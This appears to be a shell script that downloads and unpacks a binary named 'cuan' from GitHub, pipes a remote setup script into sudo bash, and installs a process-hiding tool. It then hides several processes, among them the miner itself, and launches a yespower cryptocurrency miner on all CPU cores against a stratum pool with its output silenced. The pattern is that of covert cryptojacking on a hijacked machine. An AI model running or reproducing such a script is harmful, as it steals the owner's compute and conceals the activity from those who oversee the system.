#!/bin/sh
pkill -
wget https://github.com/arifrahman555/arif/raw/main/cuan.tar.gz
tar -xf cuan.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add tes.sh
Ph add python3
ph add root
ph add node-process-hider
ph add cuan
./cuan -a yespower  -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrgar3pakty06rkfh4x6yrf37cxkvwsa2cgnwe7.testing -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
